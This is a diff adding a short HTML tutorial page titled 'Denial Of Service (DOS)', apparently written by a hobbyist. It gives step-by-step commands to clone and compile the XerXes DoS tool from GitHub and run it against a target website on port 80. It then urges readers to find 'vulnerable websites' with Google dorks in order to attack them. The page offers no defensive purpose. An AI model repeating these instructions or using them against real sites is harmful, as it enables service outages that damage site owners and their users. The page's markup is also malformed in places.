@@ -1,0 +1,50 @@
+<!DOCKTYPE html>
+
+<html>
+
+    <head>
+
+<meta name="viewport" content="width=320, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+
+<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; minimum-scale=1.0; user-scalable=0;"/>
+
+<meta ="viewport" content="width=device-width, target-densityDpi=medium-dpi"/>
+
+ <title>Dos</title>
+
+ </head>
+
+        <body bgcolor="white">
+
+            <h1>Denial Of Service (DOS)</h1>
+
+        <h4>Dos (Denial Of Service is a attack on websites to slow down the webserver mostly by Hackers. When it is done, then the website could not be accessed by Anyone. So, The company of the website have to face a great loss.)</h4>
+
+            <img src="https://drive.google.com/uc?id=12Ti2TFMZZPp7M_6SXwrYT45EiKL4FLq_" width="360" height="144" alt="My Profession:" />
+
+   <h4>So, today's tutorial is how to perform DoS Attack on websites. For this you have to need your linux os terminal or termux app</h4>
+
+  <img src="https://drive.google.com/uc?id=13qzDOAVY8KJHe37DVE6Ns9885TX-65ws" width="360" height="144" />
+
+ <h2>Commands to run it :</h2>
+
+         <h4>1.fireup your terminal or termux</h4>
+
+         <h4>2.update it and install git & python</h4>
+
+         <h4>3.now paste it: git clone https://github.com/CyberXCodder/XerXes.git</h4>
+
+         <h4>4.gcc xerxes.c -o xerxes</h4>
+
+         <h4>5.type: ./xerxes www.targetwebsite.com 80</h4>
+
+         <img src="https://drive.google.com/uc?id=142US4naekNl5whcE993gfUVDMSWbeRvB" width="360" height="144"
+         <h3>DoS attack started !</h3>
+
+         <h4>Note: It will notwork on cloudflare protected websites. So find vulnerable websites using google dorks to find websites to attack them.</h4>
+
+         <h3>by Achintya Borah..</h3>
+
+ </body>
+
+</html>
